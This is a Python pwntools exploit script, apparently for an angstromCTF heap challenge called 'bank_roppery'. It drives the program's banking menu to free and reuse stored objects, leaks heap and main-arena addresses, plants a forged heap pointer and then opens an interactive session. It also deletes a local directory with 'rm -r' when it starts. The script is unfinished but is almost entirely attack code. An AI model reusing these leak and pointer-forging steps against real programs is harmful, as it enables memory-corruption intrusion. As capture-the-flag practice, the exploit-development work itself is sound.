#!/usr/bin/env python


from pwn import *
import os

context.update(arch='amd64', os='linux')
os.system("rm christrc -r")
p = process(["./bank_roppery"])


# p = remote(host="shell.angstromctf.com", port=9001)


# p = process(["/usr/bin/ltrace -o trace ./bank_roppery", ], shell=True)


def recvbuffer(print_o=None):
    sleep(0.1)
    if print_o is not None:
        data = p.recv()
        print(data)
        return
    data = p.recv()
    # print(data)
    return data


def depose_money(amount, account):  # checking savings
    p.sendline('d')
    recvbuffer()
    p.sendline("%s" % amount)
    recvbuffer()
    p.sendline(account)
    recvbuffer()


def withdraw(amount, account):
    p.sendline('w')
    recvbuffer()
    p.sendline("%s" % str(amount))
    recvbuffer()
    p.sendline(account)
    recvbuffer()


def viewaccount():
    p.sendline('v')
    recvbuffer(1)


def write_check(amount, word_value, recipient, address, memo):
    p.sendline('c')
    recvbuffer()
    p.sendline(str(amount))
    recvbuffer()
    p.sendline(word_value)
    recvbuffer()
    p.sendline(recipient)
    recvbuffer()
    p.sendline(address)
    recvbuffer()
    p.sendline(memo)
    recvbuffer()


def store_object(volume, short_desc, long_desc, owner):
    p.sendline('s')
    recvbuffer()
    p.sendline(str(volume))
    recvbuffer()
    p.sendline(short_desc)
    recvbuffer()
    p.sendline(long_desc)
    recvbuffer()
    p.sendline(owner)
    recvbuffer()


def retrieve_object(id):
    p.sendline('r')
    recvbuffer()
    p.sendline(str(id))
    recvbuffer(1)


def enumerate_items():
    p.sendline('e')
    return recvbuffer()


def change_password(password):
    p.sendline('p')
    recvbuffer()
    p.sendline(password)
    recvbuffer()


def login_diff_user(username, password):
    p.sendline('l')
    recvbuffer()
    p.sendline(username)
    recvbuffer()
    p.sendline(password)
    recvbuffer()


def print_menu():
    p.sendline('h')
    recvbuffer(1)


def exit_program():
    p.sendline('x')
    p.close()


def main():
    raw_input()
    savings = "savings"
    checking = "checking"
    p.sendline("christrc")
    recvbuffer()
    p.sendline("test")
    recvbuffer()
    store_object(1000.00, 'why', 'not', 'pwn?')
    store_object(2000.00, 'why', 'not', 'pwn?')
    store_object(5010.00, 'why', 'not', 'pwn?')
    depose_money(500.00, checking)
    retrieve_object(0)
    retrieve_object(0)
    write_check(50.00, "a" + "z", 'v', 'x', 't') # pour trigger le leak
    leak = enumerate_items().split('0:')[1]
    heap_leak = leak[1:5][::-1].replace(' ', '').encode("hex")
    info("heap leak ==> : 0x%s" % heap_leak)
    leak_arena = leak[34:40][::-1].encode("hex")
    info("main arena leak ==> : 0x%s" % leak_arena)
    heap_pointer = pack(int(heap_leak, 16) - 0x88)
    store_object(1000.00, "AAAA", "\x00" * 8 + heap_pointer, "ttt")
    got_leak = enumerate_items().split('0:')[1]
    print(got_leak[70:76][::-1].encode('hex'))
    p.interactive()


if __name__ == '__main__':
    main()
